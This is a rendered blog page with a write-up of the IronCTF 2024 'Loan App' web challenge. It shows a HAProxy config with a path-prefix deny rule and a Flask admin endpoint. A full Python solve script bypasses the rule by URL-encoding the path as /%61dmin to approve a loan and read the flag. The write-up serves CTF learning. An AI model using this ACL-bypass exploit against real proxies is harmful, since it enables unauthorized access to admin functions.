@@ -1,0 +1,488 @@
+               
+
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Loan App - ByteTheCookies</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="ByteTheCookies" />
+    
+
+    
+        <meta property="og:url" content="http://localhost:1313/writeups/ironctf2024/loan_app/">
+  <meta property="og:site_name" content="ByteTheCookies">
+  <meta property="og:title" content="Loan App">
+  <meta property="og:description" content="Loan app Description: One of the first web challenges solved in ctf, not very complex (at least the unintended solution)
+Introduction This is the challenge web with the most solutions, which I must say is very nice, my solution is the unintended but also the most common one, in fact the correct approach would have been to do ‘request smuggling’, which is a much more complex attack to bypass the proxy, which in this case consists of splitting a request between proxy and backend.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-10-06T14:41:13+02:00">
+    <meta property="article:modified_time" content="2024-10-06T14:41:13+02:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Proxy Bypass">
+    <meta property="article:tag" content="394 Points">
+    <meta property="article:tag" content="129 Solves">
+    <meta property="article:tag" content="Vigneswar">
+
+    
+
+    
+        
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Loan App">
+  <meta name="twitter:description" content="Loan app Description: One of the first web challenges solved in ctf, not very complex (at least the unintended solution)
+Introduction This is the challenge web with the most solutions, which I must say is very nice, my solution is the unintended but also the most common one, in fact the correct approach would have been to do ‘request smuggling’, which is a much more complex attack to bypass the proxy, which in this case consists of splitting a request between proxy and backend.">
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+
+    
+        <script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
+></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [
+        ["\\[", "\\]"],
+        ["$$", "$$"],
+      ], 
+      inlineMath: [
+        ["\\(", "\\)"],
+        ["$", "$"],
+      ], 
+    },
+  };
+</script>
+
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'dark';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en.js" integrity=""></script>
+
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/user.css">
+
+    
+</head>
+<body><header>
+    <div id="header_left">
+        <div id="sidebar_btn">
+            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
+            <label id="sidebar_btn_label" for="sidebar_btn_input">
+                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+            </label>
+            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
+                <div id="sidebar_canvas_overlay"></div>
+            </label>
+            <div id="sidebar">
+                <ul><li>
+                            <a href="/">💻 About</a></li><li>
+                            <a href="/news/">📰 News</a></li><li>
+                            <a href="/writeups/">📑 Writeups</a></li><li>
+                            <a href="/contacts/">✉️ Contacts</a></li></ul>
+            </div>
+        </div>
+    
+        <div class="brand">
+            <div>
+                <a href="/">ByteTheCookies</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/" class="pure-menu-link">💻 About</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/news/" class="pure-menu-link">📰 News</a>
+                    
+                </li><li class="navbar-item pure-menu-item insection">
+                    
+                        <a href="/writeups/" class="pure-menu-link">📑 Writeups</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/contacts/" class="pure-menu-link">✉️ Contacts</a>
+                    
+                </li></ul>
+</nav>
+<main>
+      <div id="content" class="content-margin">
+        
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#source">Source</a></li>
+    <li><a href="#solution">Solution</a></li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+<div class="tags">
+  
+    <div class="badge">Web</div>
+
+  
+    <div class="badge">Python</div>
+
+  
+    <div class="badge">Proxy bypass</div>
+
+  
+    <div class="badge">394 points</div>
+
+  
+    <div class="badge">129 solves</div>
+
+  
+    <div class="badge">Vigneswar</div>
+
+  
+</div>
+
+<div>
+  <p class="date">
+    Last edit: Oct 6, 2024
+  </p>
+</div>
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Loan app</h1>
+<p><strong>Description</strong>: One of the first web challenges solved in ctf, not very complex (at least the unintended solution)</p>
+
+<h2 id="introduction" class="header-anchor-wrapper">Introduction
+  <a href="#introduction" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>This is the challenge web with the most solutions, which I must say is very nice, my solution is the unintended but also the most common one, in fact the correct approach would have been to do &lsquo;request smuggling&rsquo;, which is a much more complex attack to bypass the proxy, which in this case consists of splitting a request between proxy and backend.</p>
+<p>Solve intended: <a href="https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/">Something like this</a></p>
+
+<h2 id="source" class="header-anchor-wrapper">Source
+  <a href="#source" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>We focus on the proxy config</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: file.py
+
+global
+    log stdout format raw local0
+    maxconn 2000
+    user root
+    group root
+    daemon
+
+defaults
+    log global
+    option httplog
+    timeout client 30s
+    timeout server 30s
+    timeout connect 30s
+
+frontend http_front
+    mode http
+    bind :80
+    acl is_admin path_beg /admin # Miss config
+    http-request deny if is_admin # Miss config
+    default_backend gunicorn
+
+backend gunicorn
+    mode http
+    balance roundrobin
+    server loanserver loanapp:8000 maxconn 32
+
+</code></pre>
+<p>And win function</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: file.py
+
+@app.route('/admin/loan/&lt;loan_id&gt;', methods=['POST'])
+def admin_approve_loan(loan_id):
+    try:
+        mongo.db.loan.update_one({'_id': ObjectId(loan_id)}, {'$set': {'status': 'approved', 'message': FLAG}})
+        return 'OK', 200
+    except:
+        return 'Internal Server Error', 500
+
+</code></pre>
+<p><em>Comments added by me</em></p>
+
+<h2 id="solution" class="header-anchor-wrapper">Solution
+  <a href="#solution" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>The solution is very simple: just read the source code, register and login, and create a loan. Once this is done, thanks to the <code>/admin/loan/id</code> endpoint, the loan is approved by setting the flag</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: file.py
+
+#!/usr/bin/python3
+
+import http
+import requests
+from uuid import uuid4
+from bs4 import BeautifulSoup
+import urllib3.util
+
+BASE_URL = &quot;http://loanapp.1nf1n1ty.team/&quot;
+s = requests.Session()
+
+def login(username,password):
+  r = s.post(BASE_URL + &quot;login&quot;, data={&quot;username&quot;: username, &quot;password&quot;: password})
+  if r.status_code == 200:
+    print(&quot;[+] Login successful&quot;)
+  else:
+    print(&quot;[-] Login failed: &quot; + r.text)
+    exit(1)
+
+def register(username,password):
+  r = s.post(BASE_URL + &quot;register&quot;,data={&quot;username&quot;: username, &quot;password&quot;: password})
+  if r.status_code == 200:
+    print(&quot;[+] Registration successful&quot;)
+  else:
+    print(&quot;[-] Registration failed: &quot; + r.text)
+    exit(1)
+
+
+def loan_request():
+  r = s.post(BASE_URL + &quot;loan-request&quot;, data={&quot;amount&quot;: &quot;696969696969696969&quot;, &quot;reason&quot;: &quot;I need money for cookies&quot;})
+  if r.status_code == 200:
+    print(&quot;[+] Loan request successful&quot;)
+  else:
+    print(&quot;[-] Loan request failed: &quot; + r.text)
+    exit(1)
+
+def get_loan_id():
+  r = s.get(BASE_URL)
+  soup = BeautifulSoup(r.text, 'html.parser')
+  loan_id = soup.find(&quot;span&quot;, attrs={&quot;class&quot;:&quot;loan-id&quot;}).text.strip().split(&quot;: &quot;)[1]
+  return loan_id
+
+def exploit(loan_id):
+  conn = http.client.HTTPConnection(urllib3.util.parse_url(BASE_URL).host)
+  conn.request(&quot;POST&quot;, f&quot;/%61dmin/loan/{loan_id}&quot;) # Use http instead of requests for avoid auto url encoding of requests
+  response = conn.getresponse()
+  if response.status != 200:
+    print(&quot;[-] Exploit failed&quot;)
+    exit(1)
+
+def get_flag():
+  r = s.get(BASE_URL)
+  soup = BeautifulSoup(r.text, 'html.parser')
+  return soup.find(&quot;p&quot;, attrs={&quot;class&quot;: &quot;loan-message&quot;}).text.strip()[7:]
+
+def main():
+  username, password = uuid4(), uuid4()
+  print(f&quot;Username: {username} Password: {password}&quot;)
+  register(username,password)
+  login(username,password)
+  loan_request()
+  loan_id = get_loan_id()
+  print(f&quot;[+] Loan ID: {loan_id}&quot;)
+  exploit(loan_id)
+  print(f&quot;[+] Flag: {get_flag()}&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+  main()
+
+# goodluck by @akiidjk
+
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-stdout">$flag: ironCTF{L04n_4ppr0v3d_f0r_H4ck3r$!!}
+</code></pre>
+<p align='right'>Author: akiidjk </p>
+
+</article>
+</div>
+   
+      </div>
+    </main>
+<footer>
+    <article>Copyright © 2024 by ByteTheCookies Team | v1.0</article>
+</footer>
+
+</body>
+</html>
